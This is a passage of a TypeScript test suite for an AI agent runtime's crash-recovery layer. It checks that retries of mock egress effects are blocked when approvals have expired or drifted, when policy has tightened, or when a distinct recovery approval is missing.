    expect(typeof finding.event_id).toBe('string');
    expect(finding.event_id.length).toBeGreaterThan(0);
    const edge = proc2.odb.getDB().prepare(`
      SELECT * FROM audit_edges
        WHERE from_kind = 'effect' AND from_id = ?
          AND relation = 'has_ingress' AND to_id = ?
    `).get(prep.effectId, finding.id) as any;
    expect(edge).toBeTruthy();
    expect(edge.source_event_id).toBe(finding.event_id);
    // v2 audit chain verifies.
    const verify = proc2.runtime.verifyAuditChain(runId);
    expect(verify.ok).toBe(true);
  });
});

/* ============================================================
 * 11. Series 1B M1 Round 6 — recovery revalidates
 *     approval / policy / route, and the unknown->in_flight
 *     retry path uses the Round-5 capsule anchor (NOT the
 *     redactor egress hash). Plans 02 §2 + 10 §3.2.1 + §4.
 * ============================================================ */
describe('Sequence 1B M1 Round 6 — recovery revalidation', () => {
  let dir: string;
  beforeEach(() => {
    dir = newTmpDir('s1b-r6-revalidate');
    fs.mkdirSync(dir, { recursive: true });
  });
  afterEach(() => { try { fs.rmSync(dir, { recursive: true, force: true }); } catch {} });

  it('unknown->in_flight retry uses effect.capsuleFingerprint (Round 5 anchor), not the redactor egress hash', async () => {
    const masterKey = crypto.randomBytes(32);
    const dbService = new DatabaseService(dir);
    const odb = dbService.getOgraDatabase();
    const capsuleStore = new EncryptedCapsuleStore(odb, new StaticMasterKeyProvider(masterKey));
    const runtime = new DurableRuntimeService(odb, () => 'ph_r6');
    const protocol = new EffectProtocolService(odb, runtime, capsuleStore);
    const recovery = new RecoveryService(odb, runtime, capsuleStore, protocol);

    // Workspace + run + frame.
    const wsid = 'w-r6-' + crypto.randomBytes(3).toString('hex');
    odb.getDB().prepare(`INSERT INTO workspaces
      (id, name, type, default_data_classification, created_at, updated_at, workspace_tag)
      VALUES (?, 'r', 'personal', 'Public', ?, ?, hex(randomblob(16)))`)
      .run(wsid, new Date().toISOString(), new Date().toISOString());
    const runId = 'r-r6-c-' + crypto.randomBytes(3).toString('hex');
    odb.getDB().prepare(`INSERT INTO agent_runs
      (id, workspace_id, task, status, started_at)
      VALUES (?, ?, 'r6', 'created', ?)`).run(runId, wsid, new Date().toISOString());
    const root = runtime.createRootFrame({ runId });
    const child = runtime.createChildFrame({
      runId, parentFrameId: root.id, frameKind: 'plan_step',
    });
    runtime.acquireLease({ runId, holderId: 'h1', ttlMs: 60_000 });

    // The two anchors are deliberately different bytes.
    const egressHash = crypto.createHash('sha256')
      .update('egress-payload-bytes-r6-c-1').digest('hex');
    const capsuleHash = crypto.createHash('sha256')
      .update('capsule-payload-bytes-r6-c-1').digest('hex');

    // protocol.prepare with capsuleFingerprint set to the
    // capsule anchor (Round 5 separation).
    const prepared = protocol.prepare({
      runId, ownerFrameId: child.id,
      effectType: 'mock.egress', adapterKind: 'mock', adapterVersion: 'M1',
      payload: { msg: 'r6-c-1' },
      payloadFingerprint: egressHash,
      capsuleFingerprint: capsuleHash,
      idempotencyKey: 'idem-r6-c-1', scopeHash: '',
      routeDecisionId: 'rd-r6-c-1', policyEvaluationId: 'pe-r6-c-1',
      policyVersionHash: 'ph-r6-c-1',
      recoveryCapabilities: {
        supportsIdempotencyKey: true, supportsOutcomeQuery: true, supportsCompensation: false,
      },
    });
    const effect = runtime.readEffect(prepared.effectId);
    expect(effect.payloadFingerprint).toBe(egressHash);
    expect(effect.capsuleFingerprint).not.toBe(egressHash);
    expect(effect.capsuleFingerprint).toMatch(/^[a-f0-9]{64}$/);

    // Drop the effect into `unknown` (simulate a crash after
    // casToInFlight + recordUnknownOutcome path). The state
    // machine: planned -> in_flight -> unknown.
    protocol.casToInFlight({
      effectId: effect.id, expectedRevision: 1, expectedAttemptNo: 1,
      leaseHolder: 'h1',
    });
    runtime.transitionEffect({
      effectId: effect.id, expectedState: 'in_flight', nextState: 'unknown',
      expectedRevision: 2,
    });
    // Release proc1's lease so proc2 can take it.
    odb.getDB().prepare(`UPDATE recovery_leases SET released_at = ?,
      lease_version = lease_version + 1 WHERE run_id = ?`)
      .run(new Date().toISOString(), runId);

    // Drive recovery WITHOUT a condition checker — the gate
    // MUST still fail because the verifier compares against
    // effect.capsuleFingerprint, and the capsule row was
    // sealed with capsuleHash.
    const report = await recovery.recover({
      runId, holderId: 'h2',
      adapterSupportsIdempotencyKey: true,
      adapterSupportsOutcomeQuery: true,
      queryOutcome: async () => ({ applied: false }),
    });
    // Round 6: the unknown->in_flight retry path uses
    // effect.capsuleFingerprint as the verifier anchor. Since
    // it matches the capsule row, the path proceeds (and the
    // outcome query returns applied:false, which leaves the
    // effect in unknown + records an incident). Crucially,
    // we DO NOT see a `capsule_payload_mismatch` decision —
    // that was the Round-5 bug (the verifier used
    // effect.payloadFingerprint which is the egress hash).
    const decision = report.effects[0];
    // The decision should NOT be capsule_payload_mismatch —
    // it should reflect either an idempotent retry attempt or
    // an unknown outcome.
    expect(decision.decision).not.toBe('incident_blocked');
    expect(decision.detail ?? '').not.toContain('capsule_payload_mismatch');
  });

  it('rejected when approval has expired (revoked / expired / missing)', async () => {
    const masterKey = crypto.randomBytes(32);
    const dbService = new DatabaseService(dir);
    const odb = dbService.getOgraDatabase();
    const capsuleStore = new EncryptedCapsuleStore(odb, new StaticMasterKeyProvider(masterKey));
    const runtime = new DurableRuntimeService(odb, () => 'ph_r6b');
    const protocol = new EffectProtocolService(odb, runtime, capsuleStore);
    const recovery = new RecoveryService(odb, runtime, capsuleStore, protocol);
    const { DefaultRecoveryConditionChecker } = await import(
      '../../src/core/recovery-condition-checker');
    // Round 7: build a real PolicyService + RouteService so the
    // checker can re-evaluate policy + route on retry.
    const policy = new PolicyService(new AuditService(dbService));
    const route = new RouteService(policy);
    const ctxProvider = () => ({
      workspaceId: wsid, dataClassification: 'Confidential' as any,
      task: 'r6', providerId: 'p', modelId: 'm',
    });

    // Workspace + run + frame.
    const wsid = 'w-r6b-' + crypto.randomBytes(3).toString('hex');
    odb.getDB().prepare(`INSERT INTO workspaces
      (id, name, type, default_data_classification, created_at, updated_at, workspace_tag)
      VALUES (?, 'r', 'personal', 'Public', ?, ?, hex(randomblob(16)))`)
      .run(wsid, new Date().toISOString(), new Date().toISOString());
    const runId = 'r-r6b-' + crypto.randomBytes(3).toString('hex');
    odb.getDB().prepare(`INSERT INTO agent_runs
      (id, workspace_id, task, status, started_at)
      VALUES (?, ?, 'r6b', 'created', ?)`)
      .run(runId, wsid, new Date().toISOString());
    // Route decision (recovery gate also verifies this row).
    const routeId = 'rd-r6b';
    odb.getDB().prepare(`INSERT INTO route_decisions
      (id, run_id, route, data_classification, provider_id, model_id,
       requires_user_approval, created_at)
      VALUES (?, ?, 'cloud', 'Confidential', 'p', 'm', 1, ?)`)
      .run(routeId, runId, new Date().toISOString());

    // Approval row — but EXPIRED.
    const approvalId = 'ap-r6b-expired';
    const expiredAt = new Date(Date.now() - 60_000).toISOString(); // 1 min ago
    const createdAt = new Date().toISOString();
    odb.getDB().prepare(`INSERT INTO approvals
      (id, run_id, workspace_id, approval_type, decision, decided_by,
       reason, expires_at, created_at, decided_at, scope_hash,
       payload_fingerprint, policy_version_hash, revision)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`)
      .run(
        approvalId, runId, wsid,
        'redact_then_egress', 'approved', 'reviewer',
        'ok', expiredAt, createdAt, expiredAt,
        'scope-r6b', 'fp-r6b', 'ph-r6b', 1,
      );

    const root = runtime.createRootFrame({ runId });
    const child = runtime.createChildFrame({
      runId, parentFrameId: root.id, frameKind: 'plan_step',
    });
    runtime.acquireLease({ runId, holderId: 'h1', ttlMs: 60_000 });

    const egressHash = 'fp-r6b';
    const capsuleHash = crypto.createHash('sha256')
      .update('capsule-r6b').digest('hex');
    const prepared = protocol.prepare({
      runId, ownerFrameId: child.id,
      effectType: 'mock.egress', adapterKind: 'mock', adapterVersion: 'M1',
      payload: { msg: 'r6b' },
      payloadFingerprint: egressHash,
      capsuleFingerprint: capsuleHash,
      idempotencyKey: 'idem-r6b', scopeHash: 'scope-r6b',
      routeDecisionId: routeId, policyEvaluationId: 'pe-r6b',
      policyVersionHash: 'ph-r6b',
      currentApprovalId: approvalId,
    });
    const effect = runtime.readEffect(prepared.effectId);
    expect(effect.currentApprovalId).toBe(approvalId);
    expect(effect.policyVersionHash).toBe('ph-r6b');
    expect(effect.scopeHash).toBe('scope-r6b');

    // Release lease so proc2 can take it.
    odb.getDB().prepare(`UPDATE recovery_leases SET released_at = ?,
      lease_version = lease_version + 1 WHERE run_id = ?`)
      .run(new Date().toISOString(), runId);

    const checker = new DefaultRecoveryConditionChecker(
      odb, policy, route, ctxProvider, () => 'r1.0.0');
    const report = await recovery.recover({
      runId, holderId: 'h2',
      adapterSupportsIdempotencyKey: true,
      adapterSupportsOutcomeQuery: true,
      queryOutcome: async () => null,
      conditionChecker: checker,
    });
    const decision = report.effects[0];
    expect(decision.decision).toBe('incident_blocked');
    expect(decision.detail ?? '').toContain('approval_expired');
    expect(decision.detail ?? '').toContain(approvalId);
  });

  it('rejected when approval fingerprint has drifted (Sequence 0 binding anchor)', async () => {
    const masterKey = crypto.randomBytes(32);
    const dbService = new DatabaseService(dir);
    const odb = dbService.getOgraDatabase();
    const capsuleStore = new EncryptedCapsuleStore(odb, new StaticMasterKeyProvider(masterKey));
    const runtime = new DurableRuntimeService(odb, () => 'ph_r6c');
    const protocol = new EffectProtocolService(odb, runtime, capsuleStore);
    const recovery = new RecoveryService(odb, runtime, capsuleStore, protocol);
    const { DefaultRecoveryConditionChecker } = await import(
      '../../src/core/recovery-condition-checker');
    // Round 7: build a real PolicyService + RouteService so the
    // checker can re-evaluate policy + route on retry.
    const policy = new PolicyService(new AuditService(dbService));
    const route = new RouteService(policy);
    const ctxProvider = () => ({
      workspaceId: wsid, dataClassification: 'Confidential' as any,
      task: 'r6', providerId: 'p', modelId: 'm',
    });

    const wsid = 'w-r6c-' + crypto.randomBytes(3).toString('hex');
    odb.getDB().prepare(`INSERT INTO workspaces
      (id, name, type, default_data_classification, created_at, updated_at, workspace_tag)
      VALUES (?, 'r', 'personal', 'Public', ?, ?, hex(randomblob(16)))`)
      .run(wsid, new Date().toISOString(), new Date().toISOString());
    const runId = 'r-r6c-' + crypto.randomBytes(3).toString('hex');
    odb.getDB().prepare(`INSERT INTO agent_runs
      (id, workspace_id, task, status, started_at)
      VALUES (?, ?, 'r6c', 'created', ?)`)
      .run(runId, wsid, new Date().toISOString());
    const routeId = 'rd-r6c';
    odb.getDB().prepare(`INSERT INTO route_decisions
      (id, run_id, route, data_classification, provider_id, model_id,
       requires_user_approval, created_at)
      VALUES (?, ?, 'cloud', 'Confidential', 'p', 'm', 1, ?)`)
      .run(routeId, runId, new Date().toISOString());

    // Approval has a DIFFERENT fingerprint than the effect
    // (simulating a re-bind that the user did NOT approve).
    const approvalId = 'ap-r6c-drift';
    const createdAtR6c = new Date().toISOString();
    odb.getDB().prepare(`INSERT INTO approvals
      (id, run_id, workspace_id, approval_type, decision, decided_by,
       reason, expires_at, created_at, decided_at, scope_hash,
       payload_fingerprint, policy_version_hash, revision)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`)
      .run(approvalId, runId, wsid,
        'redact_then_egress', 'approved', 'reviewer',
        'ok', null, createdAtR6c, createdAtR6c,
        'scope-r6c', 'fp-OLD-NOT-PRESENT', 'ph-r6c', 1);

    const root = runtime.createRootFrame({ runId });
    const child = runtime.createChildFrame({
      runId, parentFrameId: root.id, frameKind: 'plan_step',
    });
    runtime.acquireLease({ runId, holderId: 'h1', ttlMs: 60_000 });

    const egressHash = 'fp-NEW-NOT-PRESENT';
    const capsuleHash = crypto.createHash('sha256')
      .update('capsule-r6c').digest('hex');
    const prepared = protocol.prepare({
      runId, ownerFrameId: child.id,
      effectType: 'mock.egress', adapterKind: 'mock', adapterVersion: 'M1',
      payload: { msg: 'r6c' },
      payloadFingerprint: egressHash,
      capsuleFingerprint: capsuleHash,
      idempotencyKey: 'idem-r6c', scopeHash: 'scope-r6c',
      routeDecisionId: routeId, policyEvaluationId: 'pe-r6c',
      policyVersionHash: 'ph-r6c',
      currentApprovalId: approvalId,
    });
    expect(runtime.readEffect(prepared.effectId).payloadFingerprint)
      .toBe(egressHash);

    odb.getDB().prepare(`UPDATE recovery_leases SET released_at = ?,
      lease_version = lease_version + 1 WHERE run_id = ?`)
      .run(new Date().toISOString(), runId);

    const checker = new DefaultRecoveryConditionChecker(
      odb, policy, route, ctxProvider, () => 'r1.0.0');
    const report = await recovery.recover({
      runId, holderId: 'h2',
      adapterSupportsIdempotencyKey: true,
      adapterSupportsOutcomeQuery: true,
      queryOutcome: async () => null,
      conditionChecker: checker,
    });
    const decision = report.effects[0];
    expect(decision.decision).toBe('incident_blocked');
    expect(decision.detail ?? '').toContain('approval_fingerprint_mismatch');
  });
});

/* ============================================================
 * 12. Series 1B M1 — approval consumption and retry lineage
 * ============================================================ */
describe('Sequence 1B M1 — callback approval consumption', () => {
  let dir: string;
  beforeEach(() => {
    dir = newTmpDir('s1b-approval');
    fs.mkdirSync(dir, { recursive: true });
  });
  afterEach(() => { try { fs.rmSync(dir, { recursive: true, force: true }); } catch {} });

  function insertApproval(db: any, input: {
    id: string; runId: string; workspaceId: string; payloadFingerprint: string;
    scopeHash: string; policyVersionHash: string; approvalType?: string;
    effectId?: string | null; effectRevision?: number | null;
  }): void {
    const now = new Date().toISOString();
    db.prepare(`INSERT INTO approvals (id, run_id, workspace_id, approval_type,
      decision, scope_hash, payload_fingerprint, policy_version_hash, revision,
      effect_id, effect_revision, created_at, decided_at)
      VALUES (?, ?, ?, ?, 'approved', ?, ?, ?, 1, ?, ?, ?, ?)`)
      .run(input.id, input.runId, input.workspaceId, input.approvalType ?? 'egress', input.scopeHash,
        input.payloadFingerprint, input.policyVersionHash,
        input.effectId ?? null, input.effectRevision ?? null, now, now);
  }

  it('atomically records initial binding + one-use consumption before callback', () => {
    const masterKey = crypto.randomBytes(32);
    const { odb, runtime, protocol } = wireProcess(dir, masterKey);
    const workspaceId = makeWorkspaceId(odb);
    const runId = makeRunId(odb, workspaceId);
    const routeId = `rd-approval-${crypto.randomBytes(3).toString('hex')}`;
    odb.getDB().prepare(`INSERT INTO route_decisions
      (id, run_id, route, data_classification, requires_user_approval, created_at)
      VALUES (?, ?, 'redact_then_egress', 'Confidential', 1, ?)`)
      .run(routeId, runId, new Date().toISOString());
    const root = runtime.createRootFrame({ runId });
    const firstFrame = runtime.createChildFrame({
      runId, parentFrameId: root.id, frameKind: 'plan_step',
    });
    const secondFrame = runtime.createChildFrame({
      runId, parentFrameId: root.id, frameKind: 'plan_step',
    });
    runtime.acquireLease({ runId, holderId: 'approval-holder', ttlMs: 60_000 });
    const payloadFingerprint = 'egress-fp-initial';
    const scopeHash = 'scope-initial';
    const policyVersionHash = 'policy-initial';
    const approvalId = 'approval-initial';
    insertApproval(odb.getDB(), {
      id: approvalId, runId, workspaceId, payloadFingerprint, scopeHash, policyVersionHash,
    });
    const first = protocol.prepare({
      runId, ownerFrameId: firstFrame.id, effectType: 'model.generate',
      adapterKind: 'mock', adapterVersion: 'test', payload: { n: 1 },
      payloadFingerprint, capsuleFingerprint: 'capsule-initial-1',
      currentApprovalId: approvalId, idempotencyKey: 'idem-initial-1', scopeHash,
      routeDecisionId: routeId, policyEvaluationId: 'pe-initial', policyVersionHash,
    });
    protocol.casToInFlight({
      effectId: first.effectId, expectedRevision: 1, expectedAttemptNo: 1,
      leaseHolder: 'approval-holder', approvalId,
    });
    const binding = odb.getDB().prepare(`SELECT callback_attempt_no, approval_id,
      approval_revision, binding_kind, created_event_id
      FROM effect_approval_bindings WHERE effect_id = ?`).get(first.effectId) as any;
    const consumption = odb.getDB().prepare(`SELECT approval_id, effect_id,
      callback_attempt_no, approval_revision, event_id
      FROM approval_consumptions WHERE approval_id = ?`).get(approvalId) as any;
    expect(binding).toMatchObject({
      callback_attempt_no: 1, approval_id: approvalId, approval_revision: 1,
      binding_kind: 'initial',
    });
    expect(binding.created_event_id).toBeTruthy();
    expect(consumption).toMatchObject({
      approval_id: approvalId, effect_id: first.effectId,
      callback_attempt_no: 1, approval_revision: 1,
    });
    expect(consumption.event_id).toBe(binding.created_event_id);
    expect(odb.getDB().prepare('SELECT uses_consumed FROM approvals WHERE id = ?')
      .get(approvalId)).toMatchObject({ uses_consumed: 1 });

    // A competing callback on a second effect cannot consume the same
    // approval. Its callback CAS, binding and state update all roll back.
    const second = protocol.prepare({
      runId, ownerFrameId: secondFrame.id, effectType: 'model.generate',
      adapterKind: 'mock', adapterVersion: 'test', payload: { n: 2 },
      payloadFingerprint, capsuleFingerprint: 'capsule-initial-2',
      idempotencyKey: 'idem-initial-2', scopeHash,
      routeDecisionId: routeId, policyEvaluationId: 'pe-initial', policyVersionHash,
    });
    expect(() => protocol.casToInFlight({
      effectId: second.effectId, expectedRevision: 1, expectedAttemptNo: 1,
      leaseHolder: 'approval-holder', approvalId,
    })).toThrow(/APPROVAL_REQUIRED/);
    expect(runtime.readEffect(second.effectId).state).toBe('planned');
    expect(odb.getDB().prepare('SELECT COUNT(*) AS c FROM effect_approval_bindings WHERE effect_id = ?')
      .get(second.effectId)).toMatchObject({ c: 0 });
  });

  it('requires a distinct recovery approval for unknown -> in_flight attempt 2', async () => {
    const masterKey = crypto.randomBytes(32);
    const { odb, runtime, protocol, recovery } = wireProcess(dir, masterKey);
    const workspaceId = makeWorkspaceId(odb);
    const runId = makeRunId(odb, workspaceId);
    const routeId = `rd-recovery-${crypto.randomBytes(3).toString('hex')}`;
    odb.getDB().prepare(`INSERT INTO route_decisions
      (id, run_id, route, data_classification, requires_user_approval, created_at)
      VALUES (?, ?, 'redact_then_egress', 'Confidential', 1, ?)`)
      .run(routeId, runId, new Date().toISOString());
    const root = runtime.createRootFrame({ runId });
    const frame = runtime.createChildFrame({
      runId, parentFrameId: root.id, frameKind: 'plan_step',
    });
    runtime.acquireLease({ runId, holderId: 'first-holder', ttlMs: 60_000 });
    const payloadFingerprint = 'egress-fp-recovery';
    const scopeHash = 'scope-recovery';
    const policyVersionHash = 'policy-recovery';
    const initialApprovalId = 'approval-initial-recovery';
    insertApproval(odb.getDB(), {
      id: initialApprovalId, runId, workspaceId, payloadFingerprint, scopeHash, policyVersionHash,
    });
    const prepared = protocol.prepare({
      runId, ownerFrameId: frame.id, effectType: 'model.generate',
      adapterKind: 'mock', adapterVersion: 'test', payload: { n: 1 },
      payloadFingerprint, capsuleFingerprint: 'capsule-recovery',
      currentApprovalId: initialApprovalId, idempotencyKey: 'idem-recovery', scopeHash,
      routeDecisionId: routeId, policyEvaluationId: 'pe-recovery', policyVersionHash,
      recoveryCapabilities: {
        supportsIdempotencyKey: true, supportsOutcomeQuery: true, supportsCompensation: false,
      },
    });
    protocol.casToInFlight({
      effectId: prepared.effectId, expectedRevision: 1, expectedAttemptNo: 1,
      leaseHolder: 'first-holder', approvalId: initialApprovalId,
    });
    runtime.transitionEffect({
      effectId: prepared.effectId, expectedRevision: 2,
      expectedState: 'in_flight', nextState: 'unknown',
    });
    odb.getDB().prepare(`UPDATE recovery_leases SET released_at = ?,
      lease_version = lease_version + 1 WHERE run_id = ?`)
      .run(new Date().toISOString(), runId);

    const blocked = await recovery.recover({
      runId, holderId: 'recovery-holder', adapterSupportsIdempotencyKey: true,
    });
    expect(blocked.effects[0]).toMatchObject({ decision: 'incident_blocked' });
    expect(blocked.effects[0].detail).toContain('new recovery approval');
    expect(runtime.readEffect(prepared.effectId).state).toBe('unknown');

    const administrativeApprovalId = 'approval-admin-retry';
    insertApproval(odb.getDB(), {
      id: administrativeApprovalId, runId, workspaceId, payloadFingerprint, scopeHash, policyVersionHash,
      approvalType: 'server_config', effectId: prepared.effectId, effectRevision: 3,
    });
    const adminBlocked = await recovery.recover({
      runId, holderId: 'recovery-holder', adapterSupportsIdempotencyKey: true,
      recoveryApprovalId: administrativeApprovalId,
    });
    expect(adminBlocked.effects[0]).toMatchObject({ decision: 'incident_blocked' });
    expect(adminBlocked.effects[0].detail).toContain('not valid for recovery_retry');
    expect(runtime.readEffect(prepared.effectId).state).toBe('unknown');
    expect(odb.getDB().prepare('SELECT uses_consumed FROM approvals WHERE id = ?')
      .get(administrativeApprovalId)).toMatchObject({ uses_consumed: 0 });

    const recoveryApprovalId = 'approval-recovery-retry';
    insertApproval(odb.getDB(), {
      id: recoveryApprovalId, runId, workspaceId, payloadFingerprint, scopeHash, policyVersionHash,
      approvalType: 'recovery_retry',
      effectId: prepared.effectId, effectRevision: 3,
    });
    const resumed = await recovery.recover({
      runId, holderId: 'recovery-holder', adapterSupportsIdempotencyKey: true,
      recoveryApprovalId,
    });
    expect(resumed.effects[0]).toMatchObject({ decision: 'controlled_retry', attemptNo: 2 });
    const bindings = odb.getDB().prepare(`SELECT callback_attempt_no, approval_id, binding_kind
      FROM effect_approval_bindings WHERE effect_id = ? ORDER BY callback_attempt_no`)
      .all(prepared.effectId) as any[];
    expect(bindings).toEqual([
      { callback_attempt_no: 1, approval_id: initialApprovalId, binding_kind: 'initial' },
      { callback_attempt_no: 2, approval_id: recoveryApprovalId, binding_kind: 'recovery_retry' },
    ]);
    expect(runtime.readEffect(prepared.effectId).currentApprovalId).toBe(recoveryApprovalId);
  });
});

/* ============================================================
 * 13. Series 1B M1 Round 7 — production wiring +
 *     real-time policy/route re-evaluation
 * ============================================================ */
describe('Sequence 1B M1 Round 7 — production recovery wiring', () => {
  let dir: string;
  beforeEach(() => {
    dir = newTmpDir('s1b-r7-prod');
    fs.mkdirSync(dir, { recursive: true });
  });
  afterEach(() => { try { fs.rmSync(dir, { recursive: true, force: true }); } catch {} });

  it('OgraCore exposes a recoveryService + conditionChecker + recover() entry point', async () => {
    const { OgraCore } = await import('../../src/core');
    const { OgraSecretBroker } = await import('../../src/core/secret-broker');
    const { OgraDatabase } = await import('../../src/core/database');
    void OgraDatabase;
    const secretBroker = new OgraSecretBroker(dir);
    const core = new OgraCore({
      appDataDir: dir,
      secretBroker,
      isDev: true,
    });
    await core.initialize();
    expect(core.recoveryService).toBeDefined();
    expect(core.recoveryConditionChecker).toBeDefined();
    expect(typeof core.recover).toBe('function');
    // Round 7 wiring requirement: the condition checker is
    // bound at construction time. Confirm it is the same
    // instance the OgraCore exposes.
    const checkerRef = core.recoveryConditionChecker;
    expect(checkerRef).toBe(core.recoveryConditionChecker);
  });

  it('OgraCore.recover() always injects the checker — even if caller passes undefined', async () => {
    // The production entry point MUST refuse to silently weaken the
    // gate. Exercise a real recoverable effect, rather than merely
    // asserting the checker property exists on a zero-effect run.
    const { OgraCore } = await import('../../src/core');
    const { OgraSecretBroker } = await import('../../src/core/secret-broker');
    const secretBroker = new OgraSecretBroker(dir);
    const core = new OgraCore({
      appDataDir: dir, secretBroker, isDev: true,
    });
    await core.initialize();
    // Spy on checker.check(). The wrapper MUST call it on every
    // recover() call.
    let checkCalls = 0;
    const originalCheck = core.recoveryConditionChecker.check.bind(
      core.recoveryConditionChecker);
    core.recoveryConditionChecker.check = async (i) => {
      checkCalls += 1;
      return originalCheck(i);
    };
    const wsid = 'w-r7-core-' + crypto.randomBytes(3).toString('hex');
    core.databaseService.getRawDB().prepare(`INSERT INTO workspaces
      (id, name, type, default_data_classification, created_at, updated_at, workspace_tag)
      VALUES (?, 'r', 'personal', 'Confidential', ?, ?, hex(randomblob(16)))`)
      .run(wsid, new Date().toISOString(), new Date().toISOString());
    const runId = 'r7-prod-' + crypto.randomBytes(2).toString('hex');
    core.databaseService.storeRun({
      id: runId, workspaceId: wsid, task: 'r7',
      status: 'created', startedAt: new Date().toISOString(),
    });
    const routeId = 'rd-r7-core-' + crypto.randomBytes(3).toString('hex');
    core.databaseService.getRawDB().prepare(`INSERT INTO route_decisions
      (id, run_id, route, data_classification, provider_id, model_id,
       requires_user_approval, created_at)
      VALUES (?, ?, 'cloud', 'Public', 'provider-r7', 'model-r7', 0, ?)`)
      .run(routeId, runId, new Date().toISOString());
    // This later route belongs to the same run but not this effect. The
    // checker must never use it to reconstruct the recovery policy input.
    core.databaseService.getRawDB().prepare(`INSERT INTO route_decisions
      (id, run_id, route, data_classification, provider_id, model_id,
       requires_user_approval, created_at)
      VALUES (?, ?, 'local', 'Restricted', 'provider-later', 'model-later', 0, ?)`)
      .run(`rd-r7-later-${crypto.randomBytes(3).toString('hex')}`,
        runId, new Date(Date.now() + 1_000).toISOString());
    const rootFrame = core.durableRuntime.createRootFrame({ runId });
    const effectFrame = core.durableRuntime.createChildFrame({
      runId, parentFrameId: rootFrame.id, frameKind: 'plan_step',
    });
    core.durableRuntime.acquireLease({
      runId, holderId: 'before-crash', ttlMs: 60_000,
    });
    const prepared = core.effectProtocol.prepare({
      runId, ownerFrameId: effectFrame.id,
      effectType: 'model.generate', adapterKind: 'test', adapterVersion: 'r7',
      payload: { task: 'r7' },
      payloadFingerprint: 'egress-r7',
      capsuleFingerprint: 'capsule-r7',
      idempotencyKey: 'idem-r7-core', scopeHash: 'scope-r7',
      routeDecisionId: routeId, policyEvaluationId: 'pe-r7',
      policyVersionHash: core.policyService.getPolicyVersionHash(),
      classification: 'Public',
      supportsIdempotencyKey: true,
    });
    expect(core.durableRuntime.readEffect(prepared.effectId).state).toBe('planned');
    core.databaseService.getRawDB().prepare(`UPDATE recovery_leases
      SET released_at = ?, lease_version = lease_version + 1 WHERE run_id = ?`)
      .run(new Date().toISOString(), runId);
    const routeInputs: any[] = [];
    const originalEvaluateRoute = core.routeService.evaluateRoute.bind(core.routeService);
    core.routeService.evaluateRoute = async (input) => {
      routeInputs.push(input);
      return originalEvaluateRoute(input);
    };
    const report = await core.recover({
      runId, holderId: 'h-r7',
      adapterSupportsIdempotencyKey: true,
      conditionChecker: undefined,
    });
    expect(checkCalls).toBe(1);
    expect(report.effects).toHaveLength(1);
    expect(report.effects[0].effectId).toBe(prepared.effectId);
    expect(report.effects[0].decision).toBe('controlled_retry');
    expect(routeInputs).toHaveLength(1);
    expect(routeInputs[0]).toMatchObject({
      dataClassification: 'Public', providerId: 'provider-r7',
      modelId: 'model-r7', requestedCompute: 'cloud', requiresCloud: true,
    });

    // A Core component may hold recoveryService directly. Its configured
    // checker must still win over a caller-provided permissive checker.
    core.recoveryConditionChecker.check = async () => ({
      ok: false,
      reason: 'route_policy_drift',
      detail: 'test configured production gate',
    });
    const rawServiceReport = await core.recoveryService.recover({
      runId, holderId: 'h-r7', adapterSupportsIdempotencyKey: true,
      conditionChecker: { check: async () => ({ ok: true }) },
    });
    expect(rawServiceReport.effects[0]).toMatchObject({
      effectId: prepared.effectId,
      decision: 'incident_blocked',
    });
  });

  it('rejected when current policy no longer permits the persisted route', async () => {
    // First create a route that current policy allows. Then remove the
    // live public-cloud rule before recovery; the persisted cloud route
    // must no longer be accepted merely because it existed at prepare time.
    const masterKey = crypto.randomBytes(32);
    const dbService = new DatabaseService(dir);
    const odb = dbService.getOgraDatabase();
    const runtime = new DurableRuntimeService(odb, () => 'ph_r7');
    const capsuleStore = new EncryptedCapsuleStore(odb, new StaticMasterKeyProvider(masterKey));
    const protocol = new EffectProtocolService(odb, runtime, capsuleStore);
    const recovery = new RecoveryService(odb, runtime, capsuleStore, protocol);
    const { DefaultRecoveryConditionChecker } = await import(
      '../../src/core/recovery-condition-checker');
    const audit = new AuditService(dbService);
    const policy = new PolicyService(audit);
    const route = new RouteService(policy);
    // Workspace + run + route decision persisted with route='cloud'.
    const wsid = 'w-r7-' + crypto.randomBytes(3).toString('hex');
    odb.getDB().prepare(`INSERT INTO workspaces
      (id, name, type, default_data_classification, created_at, updated_at, workspace_tag)
      VALUES (?, 'r', 'personal', 'Public', ?, ?, hex(randomblob(16)))`)
      .run(wsid, new Date().toISOString(), new Date().toISOString());
    const runId = 'r-r7-' + crypto.randomBytes(3).toString('hex');
    odb.getDB().prepare(`INSERT INTO agent_runs
      (id, workspace_id, task, status, started_at)
      VALUES (?, ?, 'r7', 'created', ?)`)
      .run(runId, wsid, new Date().toISOString());
    const routeId = 'rd-r7';
    odb.getDB().prepare(`INSERT INTO route_decisions
      (id, run_id, route, data_classification, provider_id, model_id,
       requires_user_approval, created_at)
      VALUES (?, ?, 'cloud', 'Public', 'p', 'm', 0, ?)`)
      .run(routeId, runId, new Date().toISOString());

    const root = runtime.createRootFrame({ runId });
    const child = runtime.createChildFrame({
      runId, parentFrameId: root.id, frameKind: 'plan_step',
    });
    runtime.acquireLease({ runId, holderId: 'h1', ttlMs: 60_000 });

    const egressHash = 'fp-r7';
    const capsuleHash = crypto.createHash('sha256').update('capsule-r7').digest('hex');
    const prepared = protocol.prepare({
      runId, ownerFrameId: child.id,
      effectType: 'mock.egress', adapterKind: 'mock', adapterVersion: 'M1',
      payload: { msg: 'r7' },
      payloadFingerprint: egressHash,
      capsuleFingerprint: capsuleHash,
      idempotencyKey: 'idem-r7', scopeHash: 'scope-r7',
      routeDecisionId: routeId, policyEvaluationId: 'pe-r7',
      policyVersionHash: policy.getPolicyVersionHash(),
    });
    expect(runtime.readEffect(prepared.effectId).routeDecisionId).toBe(routeId);

    // Simulate policy tightening after prepare. The recovery gate must use
    // the live RouteService/PolicyService result, not the effect snapshot.
    (policy as any).policies.delete('public-cloud-allowed');

    odb.getDB().prepare(`UPDATE recovery_leases SET released_at = ?,
      lease_version = lease_version + 1 WHERE run_id = ?`)
      .run(new Date().toISOString(), runId);

    const checker = new DefaultRecoveryConditionChecker(
      odb, policy, route, () => ({
        workspaceId: wsid, dataClassification: 'Public' as any,
        task: 'r7', providerId: 'p', modelId: 'm',
      }), () => 'r1.0.0');
    const report = await recovery.recover({
      runId, holderId: 'h2',
      adapterSupportsIdempotencyKey: true,
      adapterSupportsOutcomeQuery: true,
